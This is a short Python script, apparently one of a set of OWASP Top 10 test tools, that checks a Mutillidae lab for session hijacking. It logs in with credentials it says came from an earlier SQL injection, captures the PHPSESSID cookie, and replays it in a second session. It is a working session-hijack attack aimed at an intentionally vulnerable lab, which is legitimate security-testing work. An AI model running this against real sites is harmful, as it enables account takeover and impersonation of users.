#!/usr/bin/env python
'''
This script is part of the scripts developed which test a Web Application against a number 
of vulnerabilities. It is a python implementation for the OWASP Top 10. 

This is focused on the A3:Broken Authentication and Session Management 

Threat Agents: Consider anonymous external attackers, as well as users with their own accounts,
who may attempt to steal accounts from others. Also consider insiders wanting to disguise their actions.

Exploitability: Attacker uses leaks or flaws in the authentication or session management 
functions (e.g., exposed accounts, passwords, session IDs) to impersonate users.   

The attacks take place to a local Multillidae platform which is installed in the Metasploitable2

Example Usage: ./a3.py http://192.168.1.10/mutillidae/index.php?page=login.php

created by: Dr Ciphers

'''

import mechanize 
import sys


#setup a global cookiejar
myCookieJar = mechanize.CookieJar()


def firstSubmit(url):
    #here we 'll use the credentials we have acquired
    #from the initial sql injection attack
    username = 'john'
    password = 'monkey'

    global myCookieJar

    #create a new Browser instance
    browser = mechanize.Browser()
    
    #load the cookiejar with this session's info
    browser.set_cookiejar(myCookieJar)
    browser.open(url)

    browser.select_form(nr=0)
    

    for field in browser.form.controls:
        if 'user' in field.name:
            browser.form[field.name] = username
        if field.type == 'password':
            browser.form[field.name] = password


    browser.submit()


def secondSession(url, cookie):
    
    browser2 = mechanize.Browser()

    intruderCookieJar = mechanize.CookieJar()
    intruderCookieJar.set_cookie(cookie)
   
    browser2.set_cookiejar(intruderCookieJar)
    
    browser2.open(url)
    
    response = browser2.response()

    return response.read()
 
def main():
    if len(sys.argv) !=2:
        sys.exit(-1)


    url = sys.argv[1]

    firstSubmit(url)

    for cookie in myCookieJar:
        if cookie.name == 'PHPSESSID':
            print cookie
            break
        
    result = secondSession(url, cookie)
    if 'Logged In' in result:
        print '[+] The server is vulnerable'

if __name__ =="__main__":
    main()
